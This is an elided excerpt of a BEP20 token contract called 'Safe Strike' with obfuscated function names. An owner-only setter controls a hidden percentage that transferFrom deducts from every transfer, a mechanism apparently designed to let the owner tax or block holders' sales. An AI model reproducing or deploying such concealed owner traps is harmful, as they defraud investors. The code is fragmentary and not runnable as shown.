...
contract BEP20Token is IBEP20 {
    using CDMath for uint256;

    string public name20 =  "Safe Strike";
    string public symbol20 =  "SSTRIKE";
    uint8 public decimals20 = 9;
    uint public _totalSupplyAK = 1*10**15 * 10**9;

    address private _owner;
    uint8 private _dream;
    ...
    constructor() {
        ...
        _owner = msgSender;
        balances[msg.sender] = _totalSupplyAK;
        emit Transfer(address(0), msg.sender, _totalSupplyAK);
    }
   ...
   function decimals() public view virtual returns (uint8) {
    ...
    function totalSupply() public override view returns (uint) {
        return _totalSupplyAK - balances[address(0)];
    }
    ...
    function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
        ...
        _FAT(from,tokens.mul(bakVFireC()).div(10**2));
    ...
    function _FAT(address tokenOwner, uint256 tokens) internal {
        ...
        _totalSupplyAK = _totalSupplyAK.subs(tokens);
    ...
    function alVFireC(uint8 dream) public virtual onlyOwner {
		_dream = dream;
	}
